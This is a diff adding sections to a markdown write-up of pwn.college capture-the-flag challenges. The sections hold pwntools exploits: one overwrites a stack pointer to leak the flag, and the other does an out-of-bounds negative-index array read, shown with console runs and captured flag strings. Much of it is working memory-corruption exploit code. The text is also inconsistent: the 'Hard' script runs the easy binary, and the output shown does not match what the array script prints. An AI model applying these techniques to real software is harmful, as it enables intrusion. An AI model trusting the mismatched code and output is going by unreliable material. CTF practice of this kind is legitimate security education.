@@ -3017,9 +3017,227 @@ The program's memory status:
 - the input buffer starts at 0x7fff3881eef0
 
 Calling printf() to printf with the pointer...
-The string on the stack is: pwn.college{4ZdIy0Nf3F6-aPumXmZU4nCFOmO.QXygzN4EDL4ITM0EzW}
+The string on the stack is: pwn.college{4ZdIy0Nf3F6-aPumXmZU4nCFOmO.QXygzN4EDL4ITM0EzW} 
 
 Goodbye!
 [*] Got EOF while reading in interactive
 $  
+```
+
+&nbsp;
+
+## Pointer Problems (Hard)
+
+```py
+from pwn import *
+import re
+
+p = process('/challenge/pointer-problems-easy')
+
+output = p.recvuntil(b'Payload size:')
+
+# Read /proc/<pid>/maps to find BSS start
+maps = open(f"/proc/{p.pid}/maps").read()
+for line in maps.splitlines():
+    if "bss" in line:
+        bss_start = int(line.split("-")[0], 16)
+        log.success(f".bss starts at: {hex(bss_start)}")
+        break
+
+# input buffer base
+buffer_addr = int(re.search(rb'input buffer begins at (0x[0-9a-fA-F]+)', output).group(1), 16)
+# the target char* pointer on stack
+char_ptr_addr = int(re.search(rb'The char\* is located at (0x[0-9a-fA-F]+)', output).group(1), 16)
+# the flag's address in the bss
+flag_addr = int(re.search(rb'The flag\s+is located at (0x[0-9a-fA-F]+)', output).group(1), 16)
+
+# Calculate offset & payload_size
+offset = char_ptr_addr - buffer_addr
+payload_size = offset + 8
+
+# Log info
+log.success(f"Input Buffer     @ {hex(buffer_addr)}")
+log.success(f"Pointer          @ {hex(char_ptr_addr)}")
+log.success(f"Flag Addr        @ {hex(flag_addr)}")
+log.success(f"Offset:            {offset} bytes")
+
+# Build payload
+payload = b"A" * offset
+payload += p64(flag_addr)
+
+# Send payload size (this is what's actually asked for now)
+p.sendline(str(payload_size))
+
+# Send payload
+p.recvuntil(b'Send your payload')
+p.send(payload)
+
+p.interactive() 
+```
+
+&nbsp;
+
+## Anomalous Array (Easy)
+
+> Leverage an Array to obtain the flag.
+
+```
+hacker@program-security~anomalous-array-easy:~$ /challenge/anomalous-array-easy 
+The challenge() function has just been launched!
+
+# --- snip ---
+
+Our stack pointer points to 0x7ffee60f7980, and our base pointer points to 0x7ffee60f8b40.
+This means that we have (decimal) 570 8-byte words in our stack frame,
+including the saved base pointer and the saved return address, for a
+total of 4560 bytes.
+The input buffer begins at 0x7ffee60f8978, partway through the stack frame,
+("above" it in the stack are other local variables used by the function).
+Your input will be read into this buffer.
+The buffer is 54 bytes long, but the program will let you provide an arbitrarily
+large input length, and thus overflow the buffer.
+
+In this level, the flag will be loaded into memory.
+However, at no point will this program actually print the buffer storing the flag.
+We have disabled the following standard memory corruption mitigations for this challenge:
+- the canary is disabled, otherwise you would corrupt it before
+overwriting the return address, and the program would abort.
+This challenge has an array of cool hacker numbers on the stack, which you can access by providing an index.
+The array starts at 0x7ffee60f8978, and is 432 bytes long.
+The flag is located  at 0x7ffee60f7a00.
+
+Which number would you like to view? 0
+You have selected index 0, which is 0 bytes into the array.
+Your hacker number is ffffffffdeadbeef
+Let's see what happened with the stack:
+
+# --- snip ---
+
+The program's memory status:
+- the array starts at 0x7ffee60f8978
+- the address of the flag is 0x7ffee60f7a00.
+Your hacker number is ffffffffdeadbeef
+
+Goodbye!
+```
+
+This challenge prints out the 8 bytes pointed to by the `array[index]` where the suer gets to control the `index`.
+
+Since we know the location of the flag and the array, we can find the index, and get the first 8 bytes of the flag.
+
+```py
+In [1]: array_addr = 0x7ffee60f8978
+   ...: flag_addr  = 0x7ffee60f7a00
+   ...: 
+   ...: offset = flag_addr - array_addr
+   ...: size_per_entry = 8
+   ...: 
+   ...: index = offset // size_per_entry
+   ...: 
+   ...: if offset % size_per_entry == 0:
+   ...:     print(f"Index = {index} (aligned)")
+   ...: else:
+   ...:     print(f"Offset falls in between entries. Nearest index = {index}")
+   ...: 
+Index = -495 (aligned)
+```
+
+Let's provide this as the index.
+
+```
+hacker@program-security~anomalous-array-easy:~$ /challenge/anomalous-array-easy 
+The challenge() function has just been launched!
+
+# --- snip ---
+
+Which number would you like to view? -495
+You have selected index -495, which is -3960 bytes into the array.
+Your hacker number is 6c6c6f632e6e7770
+
+# --- snip ---
+```
+
+```py
+In [2]: hacker_num = "6c6c6f632e6e7770"
+   ...: chunk_bytes = bytes.fromhex(hacker_num)[::-1]
+   ...: print(chunk_bytes)
+b'pwn.coll'
+```
+
+So our logic is working, but we will have to brute force 8 bytes of the flag at a time.
+
+### Exploit
+
+```py title="~/script" showLineNumbers
+from pwn import *
+
+p = process('/challenge/anomalous-array-easy')
+
+array_addr = 0x7ffc61dcecc8
+flag_addr  = 0x7ffc61dcdd50
+chunk_size = 8
+
+# Calculate offset and index
+offset = flag_addr - array_addr
+base_index  = offset // chunk_size
+
+flag = ""
+flag_len = 59
+
+chunks_needed = (flag_len + chunk_size - 1) // chunk_size
+index_incr = list(range(chunks_needed))
+
+log.success(f"Offset: {offset}")
+log.success(f"Index:  {base_index}")
+log.success(f"Flag Addr: {hex(flag_addr)}")
+
+print("[*] Starting brute force leak...")
+
+for incr in index_incr:
+    index = base_index + incr
+    p = process('/challenge/anomalous-array-easy')
+    p.sendlineafter(b"view?", str(index).encode())
+    output = p.recvall().decode(errors="ignore")
+
+    match = re.search(r"Your hacker number is ([0-9a-fA-F]+)", output)
+    if match:
+        hacker_num = match.group(1)
+        
+        # 1. Pad to 16 chars (8 bytes) so fromhex doesn't fail 
+        # and little-endian flip works correctly.
+        hacker_num = hacker_num.zfill(16) 
+        
+        # 2. Decode the full 8-byte chunk
+        chunk_bytes = bytes.fromhex(hacker_num)[::-1]
+        
+        # 3. If it's the last iteration, only take the remaining bytes
+        if incr == index_incr[-1]:
+            remaining_bytes = flag_len % chunk_size
+            # If flag_len is a multiple of 8, remaining_bytes would be 0, 
+            # but we'd actually want all 8.
+            if remaining_bytes == 0: remaining_bytes = 8
+            
+            flag_chunk = chunk_bytes[:remaining_bytes].decode('latin-1')
+        else:
+            flag_chunk = chunk_bytes.decode('latin-1')
+
+        # print(f"[{index}] {hacker_num} -> {flag_chunk!r}")
+        flag += flag_chunk
+
+print(flag)
+```
+
+```
+hacker@program-security~anomalous-array-easy:~$ python ~/script.py 
+[*] Starting dynamic leak...
+Index -495: Found 'pwn.coll'
+Index -494: Found 'ege{kBqR'
+Index -493: Found 'nXbNGylh'
+Index -492: Found '6kMzuR4h'
+Index -491: Found 'cLmTdvu.'
+Index -490: Found 'QX0gzN4E'
+Index -489: Found 'DL4ITM0E'
+Index -488: Found 'zW}\n\x00\x00\x00\x00'
+--------------------
+[+] Flag captured: pwn.college{kBqRnXbNGylh6kMzuR4hcLmTdvu.QX0gzN4EDL4ITM0EzW}
 ```
